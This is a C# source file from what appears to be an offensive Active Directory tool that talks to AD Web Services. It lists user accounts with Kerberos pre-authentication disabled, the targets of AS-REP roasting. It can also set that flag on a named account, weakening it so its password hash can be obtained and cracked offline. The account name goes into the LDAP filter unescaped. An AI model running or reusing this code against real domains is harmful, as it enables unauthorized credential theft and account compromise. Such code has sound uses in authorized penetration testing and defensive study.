using SharpADWS.ADWS.Enumeration;
using SharpADWS.ADWS;
using System;
using System.Collections.Generic;
using System.ServiceModel.Channels;
using SharpADWS.ADWS.Transfer;
using System.DirectoryServices.Protocols;

namespace SharpADWS.Methods
{
    internal class DontReqPreAuth
    {
        private ADWSConnection adwsConnection = null;
        private string DefaultNamingContext = null;

        public DontReqPreAuth(ADWSConnection adwsConnection)
        {
            this.adwsConnection = adwsConnection;
            this.DefaultNamingContext = adwsConnection.DefaultNamingContext;
        }

        public void FindDontReqPreAuth()
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> userObjects = enumerateRequest.Enumerate("(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName" });

            Console.WriteLine();

            if (userObjects.Count == 0)
            {
                Console.WriteLine("[-] Not found users that do not require kerberos preauthentication!");
                return;
            }

            Console.WriteLine("[*] Found users that do not require kerberos preauthentication: ");

            foreach (ADObject userObject in userObjects)
            {
                if (userObject.Class == "user")
                {
                    Console.WriteLine("[*]     " + userObject.DistinguishedName);
                }
            }
        }

        public void SetDontReqPreAuth(string sAMAccountName)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(objectClass=user)(sAMAccountName={sAMAccountName}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "userAccountControl" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to set DontReqPreAuth does not exist!");
                return;
            }

            foreach (ADObject userObject in adObjects)
            {
                if (userObject.Class == "user")
                {
                    PutRequest putRequest = new PutRequest(adwsConnection);
                    Message modifyResponse = putRequest.ModifyRequest(userObject.DistinguishedName, DirectoryAttributeOperation.Replace, "userAccountControl", (userObject.UserAccountControl | 4194304).ToString());

                    if (!modifyResponse.IsFault)
                    {
                        Console.WriteLine($"[*] Set DontReqPreAuth for user {sAMAccountName} successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"[-] Set DontReqPreAuth for user {sAMAccountName} failed!");
                    }
                }
            }
        }
    }
}
